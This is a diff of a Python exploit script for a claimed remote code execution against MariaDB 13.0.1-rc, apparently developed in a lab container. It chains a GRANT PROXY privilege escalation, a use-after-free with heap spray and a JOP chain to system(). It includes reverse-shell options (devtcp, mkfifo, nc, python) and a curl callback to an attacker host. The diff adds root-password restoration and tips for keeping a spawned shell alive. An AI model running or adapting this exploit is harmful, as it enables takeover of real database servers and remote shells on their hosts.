@@ -3,7 +3,6 @@
 MariaDB 13.0.1-rc RCE — PURE SQL variant (fully remote, no Docker).
 
 Attack surface: ONLY a low-privilege MariaDB account + TCP to port 3306.
-No docker, no /proc/<pid>/mem, no host access.
 
 Chain:
   1. F-09  GRANT PROXY ... IDENTIFIED VIA ''   -> any user becomes full DBA
@@ -12,14 +11,21 @@ Chain:
   4. F-05  SYS_REFCURSOR UAF + heap spray      -> controlled vtable pointer V
   5. JOP   result->prepare() -> D2 -> D1 -> system(cmd)
 
-Robustness:
-  * ensure_root(): tries root/empty -> F-09 -> root/labpass.
-  * Step 4 retries across 128/256/512 MiB.
+Idempotency:
+  * ensure_root():      tries root/empty -> F-09 -> root/labpass.
+  * fix_root_after_f09: ALTER USER root back to mysql_native_password('labpass')
+                        right after F-09, before the F-05 crash. This makes
+                        every run start from a clean state.
 
-Verification:
-  Use --lhost/--lport (reverse shell) or --command with a network callback
-  (e.g. `curl http://LHOST:LPORT/$(id -u)`), since we no longer read a
-  marker file via `docker exec`.
+Robustness:
+  * Step 4 retries across 128/256/512 MiB because glibc's dynamic
+    mmap_threshold grows after large frees.
+
+Reverse shell caveat:
+  The command runs as uid 999(mysql) via system("sh -c '<cmd>'").
+  mariadbd is usually PID 1 in the container, so it dies when system()
+  returns — killing any spawned shell. Set `init: true` (and ideally
+  `restart: always`) in docker-compose.yml for a persistent shell.
 """
 import argparse
 import re
@@ -97,7 +103,8 @@ class Session:
             pass
 
 
-def one_shot(host, port, user, password, database, sql, timeout=60):
+def one_shot(host, port, user, password, database, sql, timeout=60,
+             debug=False):
     cmd = ["stdbuf", "-oL", MARIADB, "-h", host, "-P", str(port), "-u", user]
     if password:
         cmd += ["-p" + password]
@@ -105,6 +112,11 @@ def one_shot(host, port, user, password, database, sql, timeout=60):
     if not password:
         cmd.append("--skip-password")
     r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
+    if debug:
+        if r.stdout.strip():
+            print(f"[dbg] stdout: {r.stdout.strip()[:300]}")
+        if r.stderr.strip():
+            print(f"[dbg] stderr: {r.stderr.strip()[:300]}")
     return r.stdout.splitlines()
 
 
@@ -146,9 +158,9 @@ def get_regions(s, table, size):
 # ----------------------------------------------------------------------------
 
 def layout_hex(d2, d1, sys_addr, v, command):
-    """JOP layout at V.
+    """JOP layout at V (V = data_start + PAD_OFF).
 
-       V+0x20  = D2
+       V+0x20  = D2                    (prepare() vtable slot)
        V+0xa0  = system()
        V+0xa8  = V+0x140  (cmd ptr)
        V+0x100 = D1
@@ -190,7 +202,7 @@ def build_reverse_shell_cmd(lhost, lport, method):
 
 
 # ----------------------------------------------------------------------------
-# F-09 / root discovery
+# F-09 / root discovery / F-09 reversal
 # ----------------------------------------------------------------------------
 
 def _try_login(host, port, user, password, timeout=10):
@@ -210,21 +222,23 @@ def _try_login(host, port, user, password, timeout=10):
 def ensure_root(host, port, user, password, database):
     """Return (root_user, root_pass).
 
-    Order:
-      1. root with empty password (F-09 already applied)
-      2. F-09 from the low-priv user
-      3. root with 'labpass' (fallback)
+    Attempt order:
+      1. root with empty password         (F-09 already applied)
+      2. F-09 from the low-priv user      (fresh container)
+      3. root with 'labpass'              (fallback)
     """
+    # 1. root with empty password
     if _try_login(host, port, "root", ""):
         print("[+] root accessible with empty password (F-09 already applied)")
         return "root", ""
 
+    # 2. F-09 from the low-priv user
     print("[*] Step 1: F-09 GRANT PROXY privilege escalation")
     try:
         out = one_shot(host, port, user, password, database,
                        "GRANT PROXY ON CURRENT_USER() TO 'root'@'%' IDENTIFIED VIA '';"
                        "GRANT PROXY ON CURRENT_USER() TO 'root'@'localhost' IDENTIFIED VIA '';"
-                       "SELECT 'F09_OK';")
+                       "SELECT 'F09_OK';", debug=True)
     except Exception as e:
         print(f"[!] F-09 query failed: {e}")
         out = []
@@ -237,6 +251,7 @@ def ensure_root(host, port, user, password, database):
     for line in out[:10]:
         print(f"    {line}")
 
+    # 3. root with original password
     if _try_login(host, port, "root", "labpass"):
         print("[!] root accessible with original password — F-09 skipped")
         return "root", "labpass"
@@ -245,13 +260,47 @@ def ensure_root(host, port, user, password, database):
     sys.exit(1)
 
 
+def fix_root_after_f09(host, port, database, root_user, root_pass):
+    """Make F-09 reversible: restore root@% and root@localhost to 'labpass'.
+
+    F-09 set plugin='' and empty authentication_string. We must explicitly
+    set plugin back to mysql_native_password, otherwise login with 'labpass'
+    will fail even though the password is 'set'.
+
+    Called *before* CALL uaf5() (which crashes mariadbd), so the next run
+    finds root with the original credentials and F-09 works again.
+    ALTER USER affects only new connections — the current session stays valid.
+    """
+    print("[*] Restoring root to labpass (F-09 -> reversible)")
+    sql = (
+        "ALTER USER 'root'@'%' "
+        "IDENTIFIED VIA mysql_native_password USING PASSWORD('labpass');"
+        "ALTER USER 'root'@'localhost' "
+        "IDENTIFIED VIA mysql_native_password USING PASSWORD('labpass');"
+        "FLUSH PRIVILEGES;"
+        "SELECT 'FIX_OK';"
+    )
+    try:
+        out = one_shot(host, port, root_user, root_pass, database, sql,
+                       debug=True)
+        if "FIX_OK" in out:
+            print("[+] root restored to labpass")
+            return True
+        print("[!] fix_root output:")
+        for line in out[:5]:
+            print(f"    {line}")
+    except Exception as e:
+        print(f"[!] fix_root failed: {e}")
+    return False
+
+
 # ----------------------------------------------------------------------------
 # main
 # ----------------------------------------------------------------------------
 
 def main():
     ap = argparse.ArgumentParser(
-        description="MariaDB 13.0.1 pure-SQL RCE (fully remote, no Docker)")
+        description="MariaDB 13.0.1 pure-SQL RCE (fully remote)")
     ap.add_argument("--host", required=True)
     ap.add_argument("--port", type=int, default=3306)
     ap.add_argument("--user", default="lowpriv")
@@ -267,6 +316,8 @@ def main():
     ap.add_argument("--rsh-method", default="devtcp",
                     choices=["devtcp", "mkfifo", "nc", "python"])
 
+    ap.add_argument("--no-restore", action="store_true",
+                    help="Skip restoring root's password after F-09")
     args = ap.parse_args()
 
     if args.lhost:
@@ -279,11 +330,11 @@ def main():
     print(f"[*] Target: {args.user}@{args.host}:{args.port}/{args.database}")
     print(f"[*] Command: {CMD}")
 
-    # --- Step 1: root ---
+    # --- Step 1: obtain root (F-09 if needed) ---
     root_user, root_pass = ensure_root(
         args.host, args.port, args.user, args.password, args.database)
 
-    # --- Step 2: raise max_allowed_packet ---
+    # --- Step 2: raise max_allowed_packet using the root session ---
     one_shot(args.host, args.port, root_user, root_pass, args.database,
              "SET GLOBAL max_allowed_packet = 268435456;")
 
@@ -296,7 +347,7 @@ def main():
            "CREATE TABLE appdb.maps_pre (l TEXT);"
            "CREATE TABLE appdb.maps_post (l TEXT);")
 
-    # --- Step 4: create functions ---
+    # --- Step 4: create UAF trigger functions (before @fake) ---
     print("[*] Step 2: creating spray128 / grow5 / uaf5")
     spray_vars = ", ".join(f"@e3s{i:03d}=@e3pad" for i in range(128))
     sizes = [560, 624, 680, 744, 808, 872, 936, 1000, 1064, 1128,
@@ -342,7 +393,7 @@ def main():
     print(f"[+] libc base 0x{libc:x}")
     print(f"[+] D2=0x{d2:x}  D1=0x{d1:x}  system=0x{sys_addr:x}")
 
-    # --- Step 6: allocate @fake ---
+    # --- Step 6: allocate @fake; retry across sizes ---
     print("[*] Step 4: allocating @fake buffer")
     region = None
     FAKE_SIZE = REGION_SIZE = None
@@ -405,6 +456,13 @@ def main():
     s.send(f"SET @e3pad = UNHEX('{pad.hex()}');")
     print(f"[+] reclaim payload ready (V=0x{v:x} at offset 0x20)")
 
+    # --- Step 8.5: make F-09 reversible BEFORE the crash ---
+    if args.no_restore:
+        print("[*] --no-restore: skipping root restoration")
+    else:
+        fix_root_after_f09(args.host, args.port, args.database,
+                           root_user, root_pass)
+
     # --- Step 9: fire ---
     print()
     print("[*] ============ FIRING (CALL uaf5) ============")
@@ -424,6 +482,7 @@ def main():
     print()
     print("[+] ===========================================")
     print("[+]  EXPLOIT COMPLETE (pure SQL, fully remote)")
+    print("[+]  root restored to labpass — next run is clean")
     print("[+] ===========================================")
 
 
